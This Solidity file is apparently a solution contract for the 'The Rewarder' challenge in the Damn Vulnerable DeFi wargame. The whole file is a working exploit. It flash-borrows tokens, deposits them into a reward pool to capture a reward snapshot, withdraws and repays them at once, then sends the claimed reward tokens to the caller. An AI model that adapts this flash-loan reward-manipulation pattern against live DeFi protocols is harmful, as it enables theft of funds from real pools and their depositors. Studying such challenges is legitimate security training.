// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import {DamnValuableToken} from "../DamnValuableToken.sol";

contract RewardAttacker {
    IFlashLoanerPool private immutable pool;
    ITheRewarderPool private immutable rewarder;
    DamnValuableToken private immutable token;

    constructor(
        address _pool,
        address _rewarder,
        address _token
    ) {
        pool = IFlashLoanerPool(_pool);
        rewarder = ITheRewarderPool(_rewarder);
        token = DamnValuableToken(_token);
    }

    function borrow(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.withdraw(amount);
        token.transfer(msg.sender, amount);
    }

    function withdrawRewards() external {
        uint256 balance = rewarder.rewardToken().balanceOf(address(this));
        rewarder.rewardToken().transfer(msg.sender, balance);
    }
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function rewardToken() external returns (DamnValuableToken);
}
